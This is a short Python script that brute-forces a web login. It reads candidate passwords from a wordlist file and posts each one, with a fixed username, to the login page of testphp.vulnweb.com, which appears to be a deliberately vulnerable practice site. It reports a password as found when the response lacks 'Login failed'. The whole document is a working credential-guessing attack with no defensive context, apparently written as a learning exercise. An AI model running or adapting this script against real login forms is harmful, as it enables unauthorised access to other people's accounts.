import requests


url = "http://testphp.vulnweb.com/login.php"
username = "test"
password_file = "Res/R.txt"
file = open(password_file,"r")
# print(file.read())
for password in file.readlines():
    password = password.strip("\n")
    data = {'uname':username, 'pass':password, "login":'submit'}
    send_data_url = requests.post(url, data=data)
    if "Login failed" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)